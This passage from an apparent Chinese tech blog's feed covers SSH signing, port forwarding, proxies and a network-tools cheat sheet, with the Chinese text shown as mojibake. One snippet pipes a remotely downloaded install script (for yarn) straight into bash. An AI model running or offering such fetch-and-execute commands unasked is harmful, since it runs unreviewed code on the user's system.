&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ”¹å‘½ä»¤ä¼šç”Ÿæˆ README.org.sig ç­¾åæ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-keygen -Y sign -f ~/.ssh/id_ed25519 -n file README.org
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>æ ¡éªŒ&lt;/p>
&lt;p>å…ˆå‡†å¤‡ä¸€ä»½ allowed_signers æ–‡ä»¶ï¼Œå†…å®¹æ˜¯ id å’Œ public key çš„æ˜ å°„ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">min ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDxUFhyoSm3ZRR4Pm7rc/U8OdOGUWggrsUFzabTxI2lC
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ‰§è¡Œå‘½ä»¤ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ ¡éªŒç­¾å&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -I æŒ‡å®šè¦éªŒè¯è°çš„ç­¾å&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-keygen -Y verify -f /tmp/allowed_signers -I min -n file -s README.org.sig &amp;lt; README.org
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å‚è€ƒï¼š&lt;a href="https://www.agwa.name/blog/post/ssh_signatures">https://www.agwa.name/blog/post/ssh_signatures&lt;/a>&lt;/p>
&lt;h2 id="ssh-over-http-proxy">ssh over http proxy&lt;/h2>
&lt;p>é€šå¸¸æˆ‘ä»¬ä¼šç”¨åˆ° http over sshï¼Œä½†å…¶å®ä¹Ÿå¯ä»¥åè¿‡æ¥ï¼Œssh over httpï¼Œå³é€šè¿‡ Web Proxy æ¥ä½¿ç”¨ sshã€‚&lt;/p>
&lt;p>ä¿®æ”¹ &lt;code>.ssh/config&lt;/code> é…ç½®æ–‡ä»¶ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">Host ssh.server
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ProxyCommand connect -H web-proxy.server %h %p
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¿™åœ¨æœ‰äº›å—é™ç¯å¢ƒä¸‹éå¸¸æœ‰ç”¨ï¼ˆä¾‹å¦‚æœ‰äº›å…¬å¸ç½‘ç»œåªèƒ½é€šè¿‡httpä»£ç†è®¿é—®å¤–ç½‘ï¼‰ã€‚&lt;/p>
&lt;/li>
&lt;/ul></content><category scheme="https://mincodes.com/tags/ssh/" term="Ssh" label="Ssh"/><category scheme="https://mincodes.com/tags/linux/" term="Linux" label="Linux"/><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/></entry><entry><title type="text">Network Tools ç½‘ç»œå·¥å…·ç®±</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/network-tools/"/><id>https://mincodes.com/posts/network-tools/</id><updated>2023-05-08T11:08:00+00:00</updated><published>2022-10-07T11:49:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">åœ¨çº¿å°å·¥å…· æŸ¥è¯¢ IP å¯è¾¾æ€§ï¼ˆæ˜¯å¦å¯ä»¥ ping é€šï¼‰ https://ping.pe/198.211.12.133 ç½‘ç»œç«¯å£ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26â€¦</summary><content type="html">&lt;h2 id="åœ¨çº¿å°å·¥å…·">åœ¨çº¿å°å·¥å…·&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>æŸ¥è¯¢ IP å¯è¾¾æ€§ï¼ˆæ˜¯å¦å¯ä»¥ ping é€šï¼‰&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://ping.pe/198.211.12.133">https://ping.pe/198.211.12.133&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="ç½‘ç»œç«¯å£">ç½‘ç»œç«¯å£&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŸ¥çœ‹ç›‘å¬ 1080 TCP ç«¯å£çš„åº”ç”¨&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lsof -i TCP:1080 -sTCP:LISTEN
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŸ¥çœ‹ç½‘ç»œç«¯å£ç›‘å¬æƒ…å†µ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netstat -tunlp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŸ¥çœ‹ TCP ç›‘å¬ç«¯å£&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo lsof -iTCP -sTCP:LISTEN -P -n
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŸ¥çœ‹ UDP ç›‘å¬ç«¯å£&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo lsof -iUDP -P -n
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŸ¥çœ‹ç«¯å£ 55555 ç›‘å¬æƒ…å†µï¼ˆä¸è®º TCP/UDPï¼‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo lsof -i:55555
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŸ¥çœ‹æŸä¸ªè¿›ç¨‹ç›‘å¬çš„ IP/Port&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ss -nlput &lt;span class="p">|&lt;/span> grep ssh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-n
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> no port to name resolution
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> only listening sockets
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-p
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> show processes listening
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-u
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> show udp sockets
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-t
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> show tcp sotckets
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="curl">CURL&lt;/h2>
&lt;p>è·Ÿéšé‡å®šå‘ï¼Œå¹¶ä¸”ä» content-disposition header ä¸­è·å–æ–‡ä»¶åï¼Œå¹¶ä¿å­˜ä¸ºè¯¥æ–‡ä»¶åï¼š&lt;/p>
&lt;p>&lt;code>curl -JLO ````'http://www.vim.org/scripts/download_script.php?src_id=9750'&lt;/code>&lt;/p>
&lt;p>å‚æ•°è§£é‡Šï¼š&lt;/p>
&lt;ul>
&lt;li>-O è¡¨ç¤ºä½¿ç”¨è¿œç¨‹æ–‡ä»¶åï¼Œé»˜è®¤ä½¿ç”¨ url ä¸­çš„æ–‡ä»¶å&lt;/li>
&lt;li>-L è¡¨ç¤ºè·Ÿéšé‡å®šå‘&lt;/li>
&lt;li>-J è¡¨ç¤ºä½¿ç”¨æœåŠ¡å™¨æŒ‡å®šçš„ Content-Disposition header ä¸­çš„æ–‡ä»¶åï¼Œè€Œé url ä¸­çš„æ–‡ä»¶å&lt;/li>
&lt;/ul>
&lt;p>wget ä¹Ÿæœ‰ç±»ä¼¼åŠŸèƒ½ï¼š&lt;code>wget --content-disposition 'http://www.vim.org/scripts/download_script.php?src_id=9750'&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># post data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -d postthis localhost:8888
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># post with empty data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -X POST localhost:8888
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># add header&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -H &lt;span class="s2">&amp;#34;Authorization: 484995&amp;#34;&lt;/span> localhost:8888
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¸‹è½½è„šæœ¬å¹¶æ‰§è¡Œï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ä¸‹è½½å¹¶è‡ªåŠ¨å®‰è£… yarn åŒ…ç®¡ç†å·¥å…·&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl --compressed -o- -L &amp;lt;https://yarnpkg.com/install.sh&amp;gt; &lt;span class="p">|&lt;/span> bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å‚æ•°è§£é‡Šï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>-compressed&lt;/code>
è¯·æ±‚å‹ç¼©æ–¹å¼ä¼ è¾“ï¼ŒèŠ‚çœæµé‡ã€æé«˜é€Ÿåº¦&lt;/li>
&lt;li>&lt;code>-o-&lt;/code>
-o æŒ‡å®šä¿å­˜çš„æ–‡ä»¶è·¯å¾„ï¼Œå‚æ•°æŒ‡å®šä¸º &lt;code>-&lt;/code> åˆ™å¼ºåˆ¶è¾“å‡ºåˆ° stdout&lt;/li>
&lt;li>&lt;code>-L&lt;/code>
è·Ÿéšé‡å®šå‘&lt;/li>
&lt;/ul>
&lt;p>æ‰¹é‡ä¸‹è½½&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">#&lt;/span>&lt;span class="n">curl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">I&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">js&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">kspkg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bs2&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">fes&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">kuaiying&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">anzhi&lt;/span>&lt;span class="c1">--4.0.0.400006_d0c756.apk
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="n">curl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">--header &amp;#34;Range: bytes=89155500-89155509&amp;#34; https://js.a.kspkg.com/bs2/fes/kuaiying-anzhi--4.0.0.400006_d0c756.apk
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">urls&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">js&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">kspkg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bs2&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">fes&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">kuaiying&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">oppo&lt;/span>&lt;span class="c1">--4.0.0.400006_16656c.apk
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">js&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">kspkg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bs2&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">fes&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">kuaiying&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">anzhi&lt;/span>&lt;span class="c1">--4.0.0.400006_d0c756.apk
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">js&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">kspkg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bs2&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">fes&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">kuaiying&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">kw1&lt;/span>&lt;span class="c1">--4.0.0.400006_e81108.apk
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">in&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;${urls[@]}&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">do&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">curl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">--header &amp;#34;Range: bytes=89155500-89155509&amp;#34; $i &amp;gt; /dev/null || { echo &amp;#39;failed&amp;#39; ; exit 1; }
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">done&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="ssh">SSH&lt;/h2>
&lt;p>æ›´å¤š ssh ç”¨æ³•è§ï¼š&lt;a href="https://mincodes.com/posts/ssh-usage/">ssh å¸¸è§ç”¨æ³•ä»‹ç»&lt;/a>&lt;/p>
&lt;h3 id="autossh">AUTOSSH&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç›‘æ§ ssh è¿æ¥ï¼Œæ–­å¼€æ—¶è‡ªåŠ¨é‡è¿&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">autossh -M &lt;span class="m">4444&lt;/span> -NfL 9443:localhost:9443 xjp
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="æœ¬åœ°ç«¯å£è½¬å‘">æœ¬åœ°ç«¯å£è½¬å‘&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æœ¬åœ°ç«¯å£è½¬å‘&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># é€šè¿‡ ssh ç™»é™† server ä½œä¸ºè·³æ¿ï¼ŒæŠŠ target.server çš„ 80 ç«¯å£æ˜ å°„åˆ°æœ¬æœºçš„ 8888 ç«¯å£&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># localhost:8888 &amp;lt;-&amp;gt; server:22 &amp;lt;-&amp;gt; target.server:80&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh -NfL 8888:target.server:80 server
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># é€šè¿‡ ssh è½¬å‘è®¿é—® squid ä»£ç†æœåŠ¡&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh -CNf -L 7777:localhost:3128 -l username squid.server
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="openssl-ç”¨äº-base64-ç¼–è§£ç ">OpenSSL ç”¨äº base64 ç¼–è§£ç &lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">openssl enc -base64 -in myfile -out myfile.b64
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">openssl enc -d -base64 -in myfile.b64 -out myfile.decrypt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="get-ssh-server-key-fingerprint">Get ssh server key fingerprint&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># è·å–æœ¬æœºçš„ ssh æœåŠ¡çš„ key æŒ‡çº¹&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-keyscan localhost &lt;span class="p">|&lt;/span> ssh-keygen -lf -
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æˆ–è€…ï¼š&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-keygen -lf &amp;lt;&lt;span class="o">(&lt;/span>ssh-keyscan localhost 2&amp;gt;/dev/null&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="sshfs">sshfs&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sshfs nas:/mnt nas
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å‚è€ƒï¼š&lt;a href="https://www.itsfullofstars.de/2022/03/mount-a-remote-directory-via-ssh-on-macos-sshfs/">https://www.itsfullofstars.de/2022/03/mount-a-remote-directory-via-ssh-on-macos-sshfs/&lt;/a>&lt;/p>
&lt;h3 id="vnc-throught-ssh-é€šè¿‡-ssh-è½¬å‘è¿æ¥-mac-è¿œç¨‹æ¡Œé¢">VNC throught ssh é€šè¿‡ ssh è½¬å‘è¿æ¥ Mac è¿œç¨‹æ¡Œé¢&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># VNC é»˜è®¤ç›‘å¬ 5900 ç«¯å£&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh -NfL 5910:172.22.22.10:5900 &lt;span class="k">$(&lt;/span>gethomeip&lt;span class="k">)&lt;/span> -p &lt;span class="m">52222&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Finder â†’ å‰å¾€ â†’ è¿æ¥æœåŠ¡å™¨ï¼š&lt;code>vnc://localhost:5910&lt;/code>&lt;/p>
&lt;h3 id="ssh--polipo">ssh + polipo&lt;/h3>
&lt;p>polipo æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ http ä»£ç†æœåŠ¡å™¨ï¼Œä¸”å¯ä»¥å°† SOCKS ä»£ç†è½¬æˆ http ä»£ç†ã€‚&lt;/p>
&lt;p>ç»“åˆä¸Šè¿°ä¸¤ç‚¹ï¼Œssh æ­é… polipo å¯ä»¥å®ç°ä¸€ä¸ªç®€æ˜“çš„æœ¬åœ° http ä»£ç†æœåŠ¡ã€‚&lt;/p>
&lt;h2 id="nc">NC&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
